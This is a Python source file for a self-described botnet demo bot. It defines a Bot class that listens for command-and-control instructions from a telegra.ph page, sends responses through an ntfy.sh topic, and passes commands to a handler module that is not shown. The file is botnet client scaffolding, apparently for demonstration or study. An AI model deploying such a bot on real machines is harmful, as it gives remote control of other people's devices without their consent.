# BOT SCRIPT FOR THE BOTNET DEMO
from signal import signal
import time

# Botnet classes
from bots.CommandHandler import CommandHandler
from bots.C2Listener import C2Listener
from bots.Cryptographic import Cryptographic

TELEGRAPH_URL = "https://telegra.ph/BNS-TESTING-03-10"
RESPONSE_URL = "https://ntfy.sh/BNS_BN_22"


class Bot:
    def __init__(self):
        # classes
        self.crypt = Cryptographic()
        self.listener = C2Listener(bot=self, crypt=self.crypt)
        self.handler = CommandHandler(bot=self, crypt=self.crypt)

        # Bot info
        self.previous_command = None
        self.quit = False
        self.listener.start_command_listener()


    # Convert all elements of a tuple to lowercase, return the modified tuple
    def __to_lower_case(self, tpl: tuple):
        return (tpl[0].lower(), tpl[1].lower() if tpl[1] else None, tpl[2])


    def handle_command(self, command):
        command = self.__to_lower_case(command)
        self.handler.handle_command(command)